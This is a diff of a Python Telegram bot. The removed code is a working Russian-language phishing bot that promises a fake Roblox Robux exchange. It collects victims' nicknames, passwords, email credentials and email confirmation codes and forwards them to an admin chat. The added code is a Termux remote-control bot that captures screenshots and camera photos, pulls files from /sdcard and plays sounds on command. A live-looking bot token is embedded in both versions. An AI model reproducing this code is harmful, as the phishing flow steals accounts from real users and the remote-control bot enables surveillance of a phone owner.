@@ -1,85 +1,131 @@
 import telebot
-from telebot import types
+import subprocess
+import os
 import time
+from PIL import Image
+import datetime
 
-TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
-ADMIN_ID = 6760627781
+# Telegram bot token and group ID
+TOKEN = '7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84'
+GROUP_ID = '-1002576856039'
+
+# Initialize the bot
 bot = telebot.TeleBot(TOKEN)
 
-# Хранилище данных
-users_data = {}
+# Directory for temporary files
+TEMP_DIR = '/sdcard/telegram_control'
+if not os.path.exists(TEMP_DIR):
+    os.makedirs(TEMP_DIR)
 
+# Check if message is from the authorized group
+def is_authorized_group(message):
+    return str(message.chat.id) == GROUP_ID
+
+# Handler for /start command
 @bot.message_handler(commands=['start'])
-def start(message):
-    try:
-        # Проверка подписки на канал
-        markup = types.InlineKeyboardMarkup()
-        btn = types.InlineKeyboardButton(
-            "✅ Подписаться", 
-            url="https://t.me/hbgrrhve"
-        )
-        markup.add(btn)
-        
-        bot.send_message(
-            message.chat.id,
-            "📛 Для доступа к обмену необходимо подписаться на канал:",
-            reply_markup=markup
-        )
-    except Exception as e:
-        print(f"Ошибка: {e}")
+def send_welcome(message):
+    if is_authorized_group(message):
+        bot.reply_to(message, "Bot is active! Available commands:\n"
+                            "/screen - Capture and send screen\n"
+                            "/webcam - Capture and send webcam photo\n"
+                            "/upload_image <filename> - Upload an image from /sdcard\n"
+                            "/play_sound <filename> - Play a sound file from /sdcard\n"
+                            "/disable - Disable the bot")
+    else:
+        bot.reply_to(message, "This bot only works in the authorized group.")
 
-@bot.message_handler(func=lambda m: True)
-def handle_message(message):
+# Handler for /screen command
+@bot.message_handler(commands=['screen'])
+def capture_screen(message):
+    if not is_authorized_group(message):
+        bot.reply_to(message, "Unauthorized group!")
+        return
     try:
-        # Проверка подписки
-        chat_member = bot.get_chat_member("@ваш_канал", message.from_user.id)
-        if chat_member.status not in ['member', 'administrator', 'creator']:
-            bot.send_message(message.chat.id, "❌ Вы не подписаны на канал!")
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"{TEMP_DIR}/screen_{timestamp}.png"
+        # Capture screen using Termux-API
+        subprocess.run(['termux-toast', 'Capturing screen...'])
+        subprocess.run(['termux-screenshot', output_file])
+        if os.path.exists(output_file):
+            with open(output_file, 'rb') as photo:
+                bot.send_photo(message.chat.id, photo, caption="Screen capture")
+            os.remove(output_file)
+        else:
+            bot.reply_to(message, "Failed to capture screen.")
+    except Exception as e:
+        bot.reply_to(message, f"Error capturing screen: {str(e)}")
+
+# Handler for /webcam command
+@bot.message_handler(commands=['webcam'])
+def capture_webcam(message):
+    if not is_authorized_group(message):
+        bot.reply_to(message, "Unauthorized group!")
+        return
+    try:
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"{TEMP_DIR}/webcam_{timestamp}.jpg"
+        # Capture photo using Termux-API (default camera, usually front)
+        subprocess.run(['termux-toast', 'Capturing webcam...'])
+        subprocess.run(['termux-camera-photo', '-c', '0', output_file])
+        if os.path.exists(output_file):
+            with open(output_file, 'rb') as photo:
+                bot.send_photo(message.chat.id, photo, caption="Webcam capture")
+            os.remove(output_file)
+        else:
+            bot.reply_to(message, "Failed to capture webcam photo.")
+    except Exception as e:
+        bot.reply_to(message, f"Error capturing webcam: {str(e)}")
+
+# Handler for /upload_image command
+@bot.message_handler(commands=['upload_image'])
+def upload_image(message):
+    if not is_authorized_group(message):
+        bot.reply_to(message, "Unauthorized group!")
+        return
+    try:
+        filename = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
+        if not filename:
+            bot.reply_to(message, "Please provide a filename: /upload_image <filename>")
             return
-            
-        # Основная логика
-        if message.text == "🔓 Начать обмен":
-            msg = bot.send_message(message.chat.id, "Введите ник Roblox:")
-            bot.register_next_step_handler(msg, process_login)
-            
+        file_path = f"/sdcard/{filename}"
+        if os.path.exists(file_path):
+            with open(file_path, 'rb') as photo:
+                bot.send_photo(message.chat.id, photo, caption=f"Uploaded: {filename}")
+        else:
+            bot.reply_to(message, f"File {filename} not found in /sdcard")
     except Exception as e:
-        bot.send_message(ADMIN_ID, f"🚨 Ошибка: {str(e)}")
+        bot.reply_to(message, f"Error uploading image: {str(e)}")
 
-def process_login(message):
+# Handler for /play_sound command
+@bot.message_handler(commands=['play_sound'])
+def play_sound(message):
+    if not is_authorized_group(message):
+        bot.reply_to(message, "Unauthorized group!")
+        return
     try:
-        users_data[message.chat.id] = {"nick": message.text}
-        msg = bot.send_message(message.chat.id, "🔑 Введите пароль:")
-        bot.register_next_step_handler(msg, process_password)
+        filename = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
+        if not filename:
+            bot.reply_to(message, "Please provide a filename: /play_sound <filename>")
+            return
+        file_path = f"/sdcard/{filename}"
+        if os.path.exists(file_path):
+            subprocess.run(['termux-toast', f'Playing {filename}...'])
+            subprocess.run(['termux-media-player', 'play', file_path])
+            bot.reply_to(message, f"Playing sound: {filename}")
+        else:
+            bot.reply_to(message, f"File {filename} not found in /sdcard")
     except Exception as e:
-        print(e)
+        bot.reply_to(message, f"Error playing sound: {str(e)}")
 
-def process_password(message):
-    try:
-        users_data[message.chat.id]["password"] = message.text
-        msg = bot.send_message(message.chat.id, "📧 Введите email:пароль:")
-        bot.register_next_step_handler(msg, final_step)
-    except Exception as e:
-        print(e)
+# Handler for /disable command
+@bot.message_handler(commands=['disable'])
+def disable_bot(message):
+    if not is_authorized_group(message):
+        bot.reply_to(message, "Unauthorized group!")
+        return
+    bot.reply_to(message, "Bot is shutting down...")
+    bot.stop_polling()
+    exit(0)
 
-def final_step(message):
-    try:
-        users_data[message.chat.id]["email"] = message.text
-        # Отправка данных админу
-        report = f"""
-        🎣 Новые данные!
-        ID: {message.from_user.id}
-        Ник: {users_data[message.chat.id]['nick']}
-        Пароль: {users_data[message.chat.id]['password']}
-        Почта: {users_data[message.chat.id]['email']}
-        """
-        bot.send_message(ADMIN_ID, report)
-        # Фиктивный обмен
-        bot.send_message(message.chat.id, "🔍 Ищем подходящий аккаунт...")
-        time.sleep(3)
-        bot.send_message(message.chat.id, "✅ Найден аккаунт с 10K Robux!\nВведите код из email для подтверждения")
-    except Exception as e:
-        print(e)
-
-if __name__ == "__main__":
-    print("🟢 Бот запущен")
-    bot.polling(none_stop=True)
+# Start the bot
+bot.polling(none_stop=True)
